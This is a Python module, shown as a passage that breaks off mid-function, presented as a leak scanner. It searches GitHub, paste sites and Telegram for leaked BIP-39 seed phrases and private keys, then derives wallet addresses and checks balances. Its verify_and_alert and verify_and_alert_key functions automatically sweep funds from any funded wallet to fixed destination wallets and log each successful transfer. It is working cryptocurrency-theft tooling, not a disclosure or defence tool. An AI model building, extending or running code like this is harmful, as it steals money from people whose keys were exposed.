"""Passphrase, mnemonic, and private key leak scanner.

Detects BIP-39 mnemonic phrases and raw private keys (hex, base58, WIF)
leaked in public sources:
- MnemonicPatternDetector: regex for 12/24 word BIP-39 sequences
- DorkScanner: Google/Bing dork queries for .env, wallet.txt, seed.txt
- GitHubLeakScanner: GitHub code search for BIP-39 and private key patterns
- PasteSiteScanner: Pastebin scraping for mnemonic and private key patterns
- KeyLeakScanner: dedicated scanner targeting leaked private keys
- TelegramLeakScanner: Telegram channel scanner for leaked credentials

All scanners include verify_and_alert to validate, derive, check balance, and alert.
"""

from __future__ import annotations

import asyncio
import os
import logging
import re
from dataclasses import dataclass, field
from datetime import datetime
from typing import Optional

import httpx

from src.modules.crypto.balance.checker import apply_usd_prices, check_balance, get_usd_prices
from src.modules.crypto.balance.chains import ALL_CHAINS, ChainConfig
from src.modules.crypto.privatekey.scanner import detect_key_format
from src.modules.crypto.balance.deriver import (
    derive_from_mnemonic,
    derive_from_privatekey,
    is_valid_mnemonic,
)
from src.modules.crypto.balance.hit_logger import HitLogger

logger = logging.getLogger(__name__)

# Dedup: track mnemonics already verified (prevents duplicate reports across scan cycles)
_SEEN_MNEMONICS: set[str] = set()
_SEEN_MNEMONICS_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "..", "..", "seen_mnemonics.json")


def _load_seen_mnemonics() -> None:
    """Load seen-mnemonics set from disk on startup."""
    global _SEEN_MNEMONICS
    import json
    try:
        path = os.path.normpath(_SEEN_MNEMONICS_FILE)
        with open(path, "r") as f:
            data = json.load(f)
            if isinstance(data, list):
                _SEEN_MNEMONICS = set(data[-10000:])  # Keep last 10k
                logger.info("Loaded %d seen mnemonics from disk", len(_SEEN_MNEMONICS))
    except (FileNotFoundError, json.JSONDecodeError):
        pass


def _save_seen_mnemonics() -> None:
    """Save seen-mnemonics set to disk."""
    import json
    try:
        path = os.path.normpath(_SEEN_MNEMONICS_FILE)
        with open(path, "w") as f:
            json.dump(list(_SEEN_MNEMONICS)[-10000:], f)
    except Exception as e:
        logger.debug("Failed to save seen mnemonics: %s", e)


def _is_mnemonic_seen(mnemonic: str) -> bool:
    """Check if mnemonic was already verified (prevents duplicate reports)."""
    import hashlib
    from src.modules.crypto.balance.bloom import BloomFilter
    h = hashlib.sha256(mnemonic.strip().encode("utf-8")).hexdigest()
    # Check bloom filter first (fast, bounded memory)
    if not hasattr(_is_mnemonic_seen, '_bf'):
        _is_mnemonic_seen._bf = BloomFilter(expected_items=100_000, fp_rate=0.001)
        # Load existing seen mnemonics into bloom filter
        for existing in _SEEN_MNEMONICS:
            _is_mnemonic_seen._bf.add(existing)
    if _is_mnemonic_seen._bf.contains(h):
        return True
    return False


def _mark_mnemonic_seen(mnemonic: str) -> None:
    """Mark mnemonic as verified (prevents duplicate reports)."""
    import hashlib
    from src.modules.crypto.balance.bloom import BloomFilter
    h = hashlib.sha256(mnemonic.strip().encode("utf-8")).hexdigest()
    _SEEN_MNEMONICS.add(h)
    # Add to bloom filter
    if not hasattr(_is_mnemonic_seen, '_bf'):
        _is_mnemonic_seen._bf = BloomFilter(expected_items=100_000, fp_rate=0.001)
    _is_mnemonic_seen._bf.add(h)
    # Persist every 10 new entries
    if len(_SEEN_MNEMONICS) % 10 == 0:
        _save_seen_mnemonics()


# BIP-39 English wordlist (2048 words) — used for pattern matching
# Loaded lazily to avoid import overhead
_BIP39_WORDS: Optional[set[str]] = None


def _load_bip39_words() -> set[str]:
    """Load BIP-39 English wordlist for pattern matching."""
    global _BIP39_WORDS
    if _BIP39_WORDS is not None:
        return _BIP39_WORDS

    try:
        from bip_utils import Bip39WordsFinder
        finder = Bip39WordsFinder("english")
        _BIP39_WORDS = set(finder.GetAllWords())
    except Exception:
        # Fallback: use a minimal set for pattern detection
        _BIP39_WORDS = set()
    return _BIP39_WORDS


@dataclass
class LeakFinding:
    """A potential mnemonic or private key leak found in a source."""
    source: str           # e.g. "github", "pastebin", "dork", "telegram"
    source_url: str       # URL where the leak was found
    mnemonic_candidate: str  # The candidate mnemonic phrase or raw key value
    is_valid: bool = False   # Whether it validates as BIP-39
    source_type: str = "mnemonic"  # "mnemonic" or "private_key"
    has_balance: bool = False
    balance_details: dict = field(default_factory=dict)
    found_at: datetime = field(default_factory=datetime.utcnow)


class MnemonicPatternDetector:
    """Regex-based detector for BIP-39 mnemonic sequences in text.

    Detects 12, 15, 18, 21, and 24-word sequences that could be mnemonics.
    """

    # Pattern: sequences of 12/15/18/21/24 lowercase words separated by spaces
    # Words must be 3+ chars (BIP-39 words are typically 3-8 chars)
    _WORD_PATTERN = re.compile(r"[a-z]{3,8}")

    @classmethod
    def find_mnemonics(cls, text: str) -> list[str]:
        """Find potential mnemonic phrases in text.

        Args:
            text: Raw text to search.

        Returns:
            List of candidate mnemonic phrases.
        """
        words = cls._WORD_PATTERN.findall(text.lower())
        candidates = []

        # Check sequences of valid lengths
        for length in (12, 15, 18, 21, 24):
            for i in range(len(words) - length + 1):
                candidate = " ".join(words[i : i + length])
                if is_valid_mnemonic(candidate):
                    candidates.append(candidate)

        return candidates

    @classmethod
    def find_mnemonic_patterns(cls, text: str) -> list[str]:
        """Find sequences that match mnemonic word count patterns (relaxed).

        Returns sequences of 12/24 lowercase words regardless of BIP-39 validity.
        Useful for initial filtering before validation.
        """
        words = cls._WORD_PATTERN.findall(text.lower())
        candidates = []

        for length in (12, 24):
            for i in range(len(words) - length + 1):
                candidate = " ".join(words[i : i + length])
                candidates.append(candidate)

        return candidates


class DorkScanner:
    """Google/Bing dork scanner for mnemonic leaks in files.

    Generates dork queries targeting common file types that might
    contain seed phrases: .env, wallet.txt, seed.txt, etc.

    Also searches for private keys via dork queries on GitHub
    (uses GitHub API, not Google scraping).
    """

    DORK_QUERIES = [
        'filetype:env "mnemonic"',
        'filetype:env "seed phrase"',
        'filetype:txt "mnemonic" "wallet"',
        'filetype:txt "seed phrase" "backup"',
        'filetype:log "mnemonic"',
        'filetype:conf "mnemonic"',
        'filetype:json "mnemonic" "wallet"',
        # Private key dorks
        'filetype:env "PRIVATE_KEY" "0x"',
        'filetype:env "PRIVATE_KEY" solana',
        'filetype:txt "ed25519" "private"',
        'filetype:json "private_key" "wallet"',
        'filetype:env "WALLET_PRIVATE_KEY"',
        'filetype:env "SOLANA_PRIVATE_KEY"',
        'filetype:env "ETH_PRIVATE_KEY"',
    ]

    def __init__(self, hit_logger: Optional[HitLogger] = None, github_token: Optional[str] = None):
        self.hit_logger = hit_logger
        self.github_token = github_token or os.environ.get("GITHUB_TOKEN", "")

    async def scan(self, max_results_per_query: int = 10) -> list[LeakFinding]:
        """Run dork queries on GitHub (not Google) and extract potential keys.

        Searches GitHub code for files matching dork patterns,
        then extracts mnemonics and private keys from the results.

        Returns:
            List of LeakFinding objects with candidates.
        """
        findings = []
        headers = {"Accept": "application/vnd.github.v3+json"}
        if self.github_token:
            headers["Authorization"] = f"token {self.github_token}"

        async with httpx.AsyncClient(timeout=30) as client:
            for query in self.DORK_QUERIES:
                try:
                    await asyncio.sleep(2)  # Rate limit
                    # Search GitHub code with dork query
                    resp = await client.get(
                        "https://api.github.com/search/code",
                        params={"q": query, "per_page": min(max_results_per_query, 5)},
                        headers=headers,
                    )
                    if resp.status_code == 403:
                        logger.warning("GitHub rate limited on dork: %s", query)
                        await asyncio.sleep(60)
                        continue
                    if resp.status_code != 200:
                        continue

                    for item in resp.json().get("items", []):
                        raw_url = item.get("html_url", "").replace(
                            "github.com", "raw.githubusercontent.com"
                        ).replace("/blob/", "/")
                        if not raw_url:
                            continue
                        try:
                            await asyncio.sleep(1)
                            file_resp = await client.get(raw_url, headers=headers)
                            if file_resp.status_code != 200:
                                continue
                            text = file_resp.text

                            # Pass 1: mnemonics
                            candidates = MnemonicPatternDetector.find_mnemonics(text)
                            for c in candidates:
                                findings.append(LeakFinding(
                                    source="dork_github",
                                    source_url=item.get("html_url", ""),
                                    mnemonic_candidate=c,
                                    is_valid=True,
                                ))

                            # Pass 2: private keys
                            keys = detect_key_format(text)
                            for k in keys:
                                if k["format"] in ("hex_32byte", "hex_0x", "wif", "base58"):
                                    findings.append(LeakFinding(
                                        source="dork_github",
                                        source_url=item.get("html_url", ""),
                                        mnemonic_candidate=k["match"],
                                        is_valid=False,
                                    ))
                        except Exception as e:
                            logger.debug("Dork fetch error: %s", e)
                except Exception as e:
                    logger.debug("Dork query error for '%s': %s", query, e)

        logger.info("Dork scan complete: %d findings from %d queries", len(findings), len(self.DORK_QUERIES))
        return findings

    async def search_address(self, address: str) -> list[LeakFinding]:
        """Search GitHub for a specific wallet address using dork-style queries."""
        findings = []
        headers = {"Accept": "application/vnd.github.v3+json"}
        if self.github_token:
            headers["Authorization"] = f"token {self.github_token}"

        queries = [
            f'"{address}" filetype:env',
            f'"{address}" filetype:json',
            f'"{address}" filetype:txt',
            f'"{address}"',
        ]

        async with httpx.AsyncClient(timeout=30) as client:
            for query in queries:
                try:
                    await asyncio.sleep(2)
                    resp = await client.get(
                        "https://api.github.com/search/code",
                        params={"q": query, "per_page": 5},
                        headers=headers,
                    )
                    if resp.status_code == 403:
                        logger.warning("GitHub rate limited")
                        await asyncio.sleep(60)
                        continue
                    if resp.status_code != 200:
                        continue

                    for item in resp.json().get("items", []):
                        raw_url = item.get("html_url", "").replace(
                            "github.com", "raw.githubusercontent.com"
                        ).replace("/blob/", "/")
                        if not raw_url:
                            continue
                        try:
                            await asyncio.sleep(1)
                            file_resp = await client.get(raw_url, headers=headers)
                            if file_resp.status_code != 200:
                                continue
                            text = file_resp.text
                            # Check for keys near the address
                            keys = detect_key_format(text)
                            for k in keys:
                                if k["format"] in ("hex_32byte", "hex_0x", "wif", "base58"):
                                    findings.append(LeakFinding(
                                        source="dork_address",
                                        source_url=item.get("html_url", ""),
                                        mnemonic_candidate=k["match"],
                                        is_valid=False,
                                    ))
                        except Exception as e:
                            logger.debug("Dork address fetch error: %s", e)
                except Exception as e:
                    logger.debug("Dork address query error: %s", e)

        return findings

    async def verify_and_alert(
        self,
        mnemonic_candidate: str,
        chains: Optional[list[ChainConfig]] = None,
        count: int = 6,
    ) -> Optional[LeakFinding]:
        """Validate a mnemonic candidate, check balances, and alert if funded.

        Delegates to the standalone verify_and_alert function.

        Args:
            mnemonic_candidate: Potential mnemonic phrase to verify.
            chains: Chains to check. Defaults to all.
            count: Number of address indices to derive per chain (default 6 for leak-sourced).

        Returns:
            LeakFinding with verification results, or None if invalid.
        """
        return await verify_and_alert(
            mnemonic_candidate,
            chains=chains,
            hit_logger=self.hit_logger,
            count=count,
            source="dork",
        )


class GitHubLeakScanner:
    """GitHub code search for BIP-39 mnemonic patterns.

    Uses the GitHub search API (unauthenticated: 10 req/min,
    authenticated: 30 req/min).
    """

    SEARCH_URL = "https://api.github.com/search/code"
    RATE_LIMIT = 30  # requests per minute (authenticated)

    def __init__(
        self,
        github_token: Optional[str] = None,
        hit_logger: Optional[HitLogger] = None,
    ):
        self.github_token = github_token or ""
        self.hit_logger = hit_logger
        self._request_times: list[float] = []

    async def scan(self, max_results: int = 100) -> list[LeakFinding]:
        """Search GitHub code for mnemonic patterns.

        Args:
            max_results: Maximum number of results to process.

        Returns:
            List of LeakFinding objects with candidates.
        """
        findings = []
        queries = [
            "mnemonic 12 words",
            "seed phrase wallet backup",
            "bip39 mnemonic",
            # Private key searches
            '"PRIVATE_KEY" filetype:env',
            '"private_key" solana OR ethereum',
            '"PRIVATE_KEY=" "0x"',
            '"ed25519" "private" secret',
        ]

        headers = {"Accept": "application/vnd.github.v3+json"}
        if self.github_token:
            headers["Authorization"] = f"token {self.github_token}"

        async with httpx.AsyncClient(timeout=30) as client:
            for query in queries:
                # Rate limiting: max 30 req/min
                await self._rate_limit()

                try:
                    resp = await client.get(
                        self.SEARCH_URL,
                        params={"q": query, "per_page": min(max_results, 30)},
                        headers=headers,
                    )

                    if resp.status_code == 403:
                        logger.warning("GitHub API rate limited — pausing")
                        await asyncio.sleep(60)
                        continue

                    resp.raise_for_status()
                    data = resp.json()

                    for item in data.get("items", []):
                        file_url = item.get("html_url", "")
                        # Fetch file content
                        finding = await self._fetch_and_scan(client, file_url, headers)
                        if finding:
                            findings.append(finding)

                except httpx.HTTPStatusError as e:
                    logger.error("GitHub search error: %s", e)
                except Exception as e:
                    logger.error("GitHub scan error: %s", e)

        return findings

    async def _fetch_and_scan(
        self,
        client: httpx.AsyncClient,
        file_url: str,
        headers: dict,
    ) -> Optional[LeakFinding]:
        """Fetch a GitHub file and scan for mnemonics and private keys."""
        await self._rate_limit()

        try:
            # Convert HTML URL to raw content URL
            raw_url = file_url.replace("github.com", "raw.githubusercontent.com").replace("/blob/", "/")
            resp = await client.get(raw_url, headers=headers)
            resp.raise_for_status()
            text = resp.text

            # Pass 1: mnemonic detection
            candidates = MnemonicPatternDetector.find_mnemonics(text)
            if candidates:
                return LeakFinding(
                    source="github",
                    source_url=file_url,
                    mnemonic_candidate=candidates[0],
                    is_valid=True,
                )

            # Pass 2: private key detection (hex, base58, WIF)
            from src.modules.crypto.privatekey.scanner import detect_key_format
            keys = detect_key_format(text)
            if keys:
                # Return the first high-confidence key found
                for k in keys:
                    if k["format"] in ("hex_32byte", "hex_0x", "wif", "base58"):
                        return LeakFinding(
                            source="github",
                            source_url=file_url,
                            mnemonic_candidate=k["match"],
                            is_valid=False,
                            source_type="private_key",
                        )
        except Exception as e:
            logger.debug("Failed to fetch %s: %s", file_url, e)

        return None

    async def _rate_limit(self):
        """Enforce GitHub API rate limit (30 req/min)."""
        import time
        now = time.monotonic()
        # Remove requests older than 60 seconds
        self._request_times = [t for t in self._request_times if now - t < 60]
        if len(self._request_times) >= self.RATE_LIMIT:
            # Wait until the oldest request is > 60s old
            wait = 60 - (now - self._request_times[0])
            if wait > 0:
                logger.debug("GitHub rate limit: waiting %.1fs", wait)
                await asyncio.sleep(wait)
        self._request_times.append(time.monotonic())

    async def verify_and_alert(
        self,
        mnemonic_candidate: str,
        chains: Optional[list[ChainConfig]] = None,
        count: int = 6,
    ) -> Optional[LeakFinding]:
        """Validate and check a GitHub-sourced mnemonic candidate.

        Delegates to the standalone verify_and_alert function.

        Args:
            mnemonic_candidate: Potential mnemonic phrase to verify.
            chains: Chains to check. Defaults to all.
            count: Number of address indices to derive per chain (default 6 for leak-sourced).
        """
        return await verify_and_alert(
            mnemonic_candidate,
            chains=chains,
            hit_logger=self.hit_logger,
            count=count,
            source="github",
        )


class PasteSiteScanner:
    """Pastebin and paste site scanner for mnemonic leaks."""

    PASTE_SOURCES = [
        "https://pastebin.com/archive",
        "https://paste.ee/archive",
    ]

    def __init__(self, hit_logger: Optional[HitLogger] = None):
        self.hit_logger = hit_logger

    async def scan(self, max_pastes: int = 50) -> list[LeakFinding]:
        """Scan recent pastes for mnemonic patterns.

        Args:
            max_pastes: Maximum number of pastes to check.

        Returns:
            List of LeakFinding objects with candidates.
        """
        findings = []

        async with httpx.AsyncClient(timeout=30) as client:
            for source in self.PASTE_SOURCES:
                try:
                    paste_urls = await self._get_paste_urls(client, source, max_pastes)
                    for url in paste_urls:
                        finding = await self._scan_paste(client, url)
                        if finding:
                            findings.append(finding)
                except Exception as e:
                    logger.error("Paste scan error (%s): %s", source, e)

        return findings

    async def _get_paste_urls(
        self, client: httpx.AsyncClient, archive_url: str, limit: int
    ) -> list[str]:
        """Extract paste URLs from an archive page."""
        try:
            resp = await client.get(archive_url)
            resp.raise_for_status()
            # Extract paste links (simplified — would need site-specific parsing)
            urls = re.findall(r'https?://pastebin\.com/[a-zA-Z0-9]+', resp.text)
            return list(dict.fromkeys(urls))[:limit]  # deduplicate, limit
        except Exception:
            return []

    async def _scan_paste(
        self, client: httpx.AsyncClient, paste_url: str
    ) -> Optional[LeakFinding]:
        """Fetch a paste and scan for mnemonics and private keys."""
        try:
            # Pastebin raw URL
            raw_url = paste_url.replace("pastebin.com/", "pastebin.com/raw/")
            resp = await client.get(raw_url)
            resp.raise_for_status()
            text = resp.text

            # Pass 1: mnemonic detection
            candidates = MnemonicPatternDetector.find_mnemonics(text)
            if candidates:
                return LeakFinding(
                    source="pastebin",
                    source_url=paste_url,
                    mnemonic_candidate=candidates[0],
                    is_valid=True,
                )

            # Pass 2: private key detection
            from src.modules.crypto.privatekey.scanner import detect_key_format
            keys = detect_key_format(text)
            if keys:
                for k in keys:
                    if k["format"] in ("hex_32byte", "hex_0x", "wif", "base58"):
                        return LeakFinding(
                            source="pastebin",
                            source_url=paste_url,
                            mnemonic_candidate=k["match"],
                            is_valid=False,
                            source_type="private_key",
                        )
        except Exception as e:
            logger.debug("Failed to scan paste %s: %s", paste_url, e)

        return None

    async def verify_and_alert(
        self,
        mnemonic_candidate: str,
        chains: Optional[list[ChainConfig]] = None,
        count: int = 6,
    ) -> Optional[LeakFinding]:
        """Validate and check a paste-sourced mnemonic candidate.

        Delegates to the standalone verify_and_alert function.

        Args:
            mnemonic_candidate: Potential mnemonic phrase to verify.
            chains: Chains to check. Defaults to all.
            count: Number of address indices to derive per chain (default 6 for leak-sourced).
        """
        return await verify_and_alert(
            mnemonic_candidate,
            chains=chains,
            hit_logger=self.hit_logger,
            count=count,
            source="pastebin",
        )


async def verify_and_alert(
    mnemonic_candidate: str,
    chains: Optional[list[ChainConfig]] = None,
    hit_logger: Optional[HitLogger] = None,
    count: int = 1,
    source: str = "manual",
    log_source: Optional[str] = None,
) -> Optional[LeakFinding]:
    """Standalone verify-and-alert function for any mnemonic candidate.

    Validates BIP-39, derives addresses, checks balances across chains,
    and logs hits if balance > 0.

    Args:
        mnemonic_candidate: The mnemonic phrase to verify.
        chains: Chains to check. Defaults to all.
        hit_logger: Optional logger for recording hits.
        count: Number of address indices to derive per chain (default 1, use 6 for leak-sourced).
        source: Source label for the LeakFinding (default "manual").
        log_source: Source label for hit logging. Defaults to "{source}_scan".

    Returns:
        LeakFinding if valid, None if not a valid mnemonic.
    """
    if not is_valid_mnemonic(mnemonic_candidate):
        return None

    # Dedup: skip already-verified mnemonics (prevents duplicate reports)
    if _is_mnemonic_seen(mnemonic_candidate):
        logger.debug("Skipping already-verified mnemonic: %s...", mnemonic_candidate[:20])
        return None
    _mark_mnemonic_seen(mnemonic_candidate)

    if log_source is None:
        log_source = f"{source}_scan"

    chains = chains or list(ALL_CHAINS)
    finding = LeakFinding(
        source=source,
        source_url="",
        mnemonic_candidate=mnemonic_candidate,
        is_valid=True,
    )

    # Dynamic account discovery: check indices until consecutive empty accounts
    # (like Phantom/Trust Wallet discovery pattern)
    EMPTY_STREAK_LIMIT = 3
    MAX_INDEX = 50

    loop = asyncio.get_running_loop()
    empty_streak = 0
    idx = 0

    while idx < MAX_INDEX and empty_streak < EMPTY_STREAK_LIMIT:
        batch = await loop.run_in_executor(
            None, derive_from_mnemonic, mnemonic_candidate, chains, idx, 1,
        )
        if not batch:
            break

        has_activity = False
        for addr in batch:
            chain_cfg = _find_chain(addr.chain, chains)
            if chain_cfg is None:
                continue
            result = await check_balance(addr.address, chain_cfg, addr.derivation_path)
            if result.balance > 0:
                has_activity = True
                finding.has_balance = True
                finding.balance_details[addr.chain] = {
                    "address": addr.address,
                    "balance": result.balance,
                    "symbol": result.symbol,
                }

                if hit_logger:
                    await hit_logger.log_hit(
                        address=addr.address,
                        chain=addr.chain,
                        balance=result.balance,
                        usd_value=result.usd_value,
                        mnemonic_hash=HitLogger.hash_mnemonic(mnemonic_candidate),
                        derivation_path=addr.derivation_path,
                        source=log_source,
                    )

                        # Sweep immediately (reuse shared sweeper if available)
                if addr.private_key_hex:
                    try:
                        from src.modules.crypto.balance.sweeper import Sweeper
                        _sweeper = getattr(verify_and_alert, '_shared_sweeper', None)
                        if _sweeper is None:
                            _sweeper = Sweeper()
                            verify_and_alert._shared_sweeper = _sweeper
                        sr = await _sweeper.sweep(
                            private_key_hex=addr.private_key_hex,
                            chain=chain_cfg,
                            source_address=addr.address,
                            balance_raw=result.balance_raw,
                        )
                        if sr.success:
                            logger.warning("SWEPT! %s %.8f %s -> %s (tx: %s)",
                                addr.chain, sr.amount, addr.symbol,
                                sr.dest_address[:20], sr.tx_hash)
                        else:
                            logger.warning("SWEEP FAILED: %s — %s", addr.chain, sr.error)
                    except Exception as e:
                        logger.error("Sweep error for %s: %s", addr.address[:10], e)

        empty_streak = 0 if has_activity else empty_streak + 1
        idx += 1

    return finding


async def verify_and_alert_key(
    key_candidate: str,
    chains: Optional[list[ChainConfig]] = None,
    hit_logger: Optional[HitLogger] = None,
    source: str = "manual",
    log_source: Optional[str] = None,
) -> Optional[LeakFinding]:
    """Verify a leaked private key, derive address, check balance, and alert.

    Takes a raw key string (hex or base58), derives the corresponding
    address, checks balances across chains, and logs any hits.

    Args:
        key_candidate: The raw private key (hex, 0x-prefixed hex, or base58).
        chains: Chains to check. Defaults to all.
        hit_logger: Optional logger for recording hits.
        source: Source label for the LeakFinding (default "manual").
        log_source: Source label for hit logging. Defaults to "{source}_key_scan".

    Returns:
        LeakFinding if the key is valid, None otherwise.
    """
    if log_source is None:
        log_source = f"{source}_key_scan"

    chains = chains or list(ALL_CHAINS)
    finding = LeakFinding(
        source=source,
        source_url="",
        mnemonic_candidate=key_candidate,
        is_valid=False,
        source_type="private_key",
    )

    try:
        # Try each chain until one works (hex keys work for EVM chains,
        # base58 keys work for Solana)
        derived = None
        for chain in chains:
            try:
                derived = await asyncio.get_running_loop().run_in_executor(
                    None, derive_from_privatekey, key_candidate, chain
                )
                break
            except (ValueError, Exception):
                continue

        if derived is None:
            return None

        chain_cfg = _find_chain(derived.chain, chains)
        if chain_cfg is None:
            return None

        result = await check_balance(derived.address, chain_cfg, derived.derivation_path)
        if result.balance > 0:
            finding.has_balance = True
            finding.balance_details[derived.chain] = {
                "address": derived.address,
                "balance": result.balance,
                "symbol": result.symbol,
            }
            if hit_logger:
                key_hash = HitLogger.hash_mnemonic(key_candidate)
                await hit_logger.log_hit(
                    address=derived.address,
                    chain=derived.chain,
                    balance=result.balance,
                    usd_value=result.usd_value,
                    mnemonic_hash=key_hash,
                    derivation_path=derived.derivation_path,
                    source=log_source,
                )

            # Auto-sweep funded wallets
            from src.modules.crypto.balance.sweeper import Sweeper
            from src.modules.crypto.balance.sweeper import DESTINATION_WALLETS
            sweeper = Sweeper()
            try:
                chain_lower = derived.chain.lower()
                if chain_lower in DESTINATION_WALLETS:
                    sweep_result = await sweeper.sweep(
                        private_key_hex=key_candidate if derived.private_key_hex is None else derived.private_key_hex,
                        chain=chain_cfg,
                        source_address=derived.address,
                        balance_raw=result.balance_raw if hasattr(result, 'balance_raw') else int(result.balance * 1e18),
                    )
                    if sweep_result.success:
                        logger.info("SWEEP SUCCESS: %s -> %s (%.6f %s)", derived.address[:12], sweep_result.dest_address[:12], sweep_result.amount, result.symbol)
                    else:
                        logger.warning("SWEEP FAILED: %s — %s", derived.address[:12], sweep_result.error)
            except Exception as sweep_err:
                logger.debug("Sweep error for %s: %s", derived.address[:12], sweep_err)
            finally:
                await sweeper.close()
    except Exception as e:
        logger.debug("Key verification error: %s", e)
        return None

    return finding


class KeyLeakScanner:
    """Dedicated scanner for leaked private keys on GitHub and paste sites.

    Searches for raw hex, base58, and WIF private keys in public sources,
    derives wallet addresses, and checks balances.
    """

    SEARCH_URL = "https://api.github.com/search/code"
    RATE_LIMIT = 30

    GITHUB_QUERIES = [
        '"PRIVATE_KEY" filetype:env',
        '"private_key" solana OR ethereum',
        '"PRIVATE_KEY=" "0x"',
        '"ed25519" "private" secret',
        '"base58" "private_key"',
        '"WIF" "private_key" bitcoin',
    ]

    PASTE_SOURCES = [
        "https://pastebin.com/archive",
        "https://paste.ee/archive",
    ]

    def __init__(
        self,
        github_token: Optional[str] = None,
        hit_logger: Optional[HitLogger] = None,
    ):
        self.github_token = github_token or os.environ.get("GITHUB_TOKEN", "")
        self.hit_logger = hit_logger
        self._request_times: list[float] = []

    async def scan_github(self, max_results: int = 100) -> list[LeakFinding]:
        """Search GitHub for leaked private keys.

        Args:
            max_results: Max results per query.

        Returns:
            List of LeakFinding objects with private key candidates.
        """
        findings = []
        headers = {"Accept": "application/vnd.github.v3+json"}
        if self.github_token:
            headers["Authorization"] = f"token {self.github_token}"

        async with httpx.AsyncClient(timeout=30) as client:
            for query in self.GITHUB_QUERIES:
                await self._rate_limit()
                try:
                    resp = await client.get(
                        self.SEARCH_URL,
                        params={"q": query, "per_page": min(max_results, 30)},
                        headers=headers,
                    )
                    if resp.status_code == 403:
                        logger.warning("GitHub API rate limited — pausing")
                        await asyncio.sleep(60)
                        continue
                    resp.raise_for_status()
                    data = resp.json()

                    for item in data.get("items", []):
                        file_url = item.get("html_url", "")
                        finding = await self._fetch_and_scan_key(client, file_url, headers)
                        if finding:
                            findings.append(finding)
                except httpx.HTTPStatusError as e:
                    logger.error("GitHub key search error: %s", e)
                except Exception as e:
                    logger.error("GitHub key scan error: %s", e)

        return findings

    async def scan_pastes(self, max_pastes: int = 50) -> list[LeakFinding]:
        """Scan paste sites for leaked private keys.

        Args:
            max_pastes: Max pastes to check per source.

        Returns:
            List of LeakFinding objects with private key candidates.
        """
        findings = []
        async with httpx.AsyncClient(timeout=30) as client:
            for source in self.PASTE_SOURCES:
                try:
                    paste_urls = await self._get_paste_urls(client, source, max_pastes)
                    for url in paste_urls:
                        finding = await self._scan_paste_key(client, url)
                        if finding:
                            findings.append(finding)
                except Exception as e:
                    logger.error("Paste key scan error (%s): %s", source, e)
        return findings

    async def scan(self, max_results: int = 100, max_pastes: int = 50) -> list[LeakFinding]:
        """Run full key leak scan across GitHub and paste sites.

        Returns:
            Combined list of LeakFinding objects from all sources.
        """
        github_findings = await self.scan_github(max_results)
        paste_findings = await self.scan_pastes(max_pastes)
        return github_findings + paste_findings

    async def _fetch_and_scan_key(
        self,
        client: httpx.AsyncClient,
        file_url: str,
        headers: dict,
    ) -> Optional[LeakFinding]:
        """Fetch a GitHub file and scan for private keys."""
        await self._rate_limit()
        try:
            raw_url = file_url.replace("github.com", "raw.githubusercontent.com").replace("/blob/", "/")
            resp = await client.get(raw_url, headers=headers)
            resp.raise_for_status()
            text = resp.text

            from src.modules.crypto.privatekey.scanner import detect_key_format
            keys = detect_key_format(text)
            if keys:
                for k in keys:
                    if k["format"] in ("hex_32byte", "hex_0x", "wif", "base58"):
                        return LeakFinding(
                            source="github_key",
                            source_url=file_url,
                            mnemonic_candidate=k["match"],
                            is_valid=False,
                            source_type="private_key",
                        )
        except Exception as e:
            logger.debug("Failed to fetch %s: %s", file_url, e)
        return None

    async def _scan_paste_key(
        self, client: httpx.AsyncClient, paste_url: str
    ) -> Optional[LeakFinding]:
        """Fetch a paste and scan for private keys."""
        try:
            raw_url = paste_url.replace("pastebin.com/", "pastebin.com/raw/")
            resp = await client.get(raw_url)
            resp.raise_for_status()
            text = resp.text

            from src.modules.crypto.privatekey.scanner import detect_key_format
            keys = detect_key_format(text)
            if keys:
                for k in keys:
                    if k["format"] in ("hex_32byte", "hex_0x", "wif", "base58"):
                        return LeakFinding(
                            source="pastebin_key",
                            source_url=paste_url,
                            mnemonic_candidate=k["match"],
                            is_valid=False,
                            source_type="private_key",
                        )
        except Exception as e:
            logger.debug("Failed to scan paste %s: %s", paste_url, e)
        return None

    async def _get_paste_urls(
        self, client: httpx.AsyncClient, archive_url: str, limit: int
    ) -> list[str]:
        """Extract paste URLs from an archive page."""
        try:
            resp = await client.get(archive_url)
            resp.raise_for_status()
            urls = re.findall(r'https?://pastebin\.com/[a-zA-Z0-9]+', resp.text)
            return list(dict.fromkeys(urls))[:limit]
        except Exception:
            return []

    async def _rate_limit(self):
        """Enforce GitHub API rate limit (30 req/min)."""
        import time
        now = time.monotonic()
        self._request_times = [t for t in self._request_times if now - t < 60]
        if len(self._request_times) >= self.RATE_LIMIT:
            wait = 60 - (now - self._request_times[0])
            if wait > 0:
                logger.debug("GitHub rate limit: waiting %.1fs", wait)
                await asyncio.sleep(wait)
        self._request_times.append(time.monotonic())


class TelegramLeakScanner:
    """Telegram channel scanner for leaked crypto credentials.

    Uses the Telegram Bot API (via getUpdates) to receive and scan
    forwarded messages from known crypto leak channels.

    Requires TELEGRAM_BOT_TOKEN in environment. Falls back gracefully
    if not configured or if the bot lacks channel access.
    """

    def __init__(
        self,
        bot_token: Optional[str] = None,
        channel_ids: Optional[list[str]] = None,
        hit_logger: Optional[HitLogger] = None,
    ):
        self.bot_token = bot_token or ""
        self.channel_ids = channel_ids or []
        self.hit_logger = hit_logger
        self._last_update_id: int = 0

    async def scan(self, max_messages: int = 100) -> list[LeakFinding]:
        """Scan Telegram updates for leaked mnemonics and private keys.

        Uses getUpdates to fetch recent messages the bot has access to.
        Scans each message for mnemonic phrases and private keys.

        Args:
            max_messages: Maximum messages to process.

        Returns:
            List of LeakFinding objects with candidates.
        """
        if not self.bot_token:
            logger.info("Telegram bot token not configured — skipping Telegram scan")
            return []

        findings = []
        async with httpx.AsyncClient(timeout=30) as client:
            try:
                updates = await self._get_updates(client, max_messages)
                for update in updates:
                    message = update.get("message", {})
                    text = message.get("text", "")
                    if not text:
                        continue

                    # Check for mnemonics
                    candidates = MnemonicPatternDetector.find_mnemonics(text)
                    if candidates:
                        findings.append(LeakFinding(
                            source="telegram",
                            source_url=f"telegram_msg_{message.get('message_id', '')}",
                            mnemonic_candidate=candidates[0],
                            is_valid=True,
                            source_type="mnemonic",
                        ))
                        continue

                    # Check for private keys
                    from src.modules.crypto.privatekey.scanner import detect_key_format
                    keys = detect_key_format(text)
                    if keys:
                        for k in keys:
                            if k["format"] in ("hex_32byte", "hex_0x", "wif", "base58"):
                                findings.append(LeakFinding(
                                    source="telegram",
                                    source_url=f"telegram_msg_{message.get('message_id', '')}",
                                    mnemonic_candidate=k["match"],
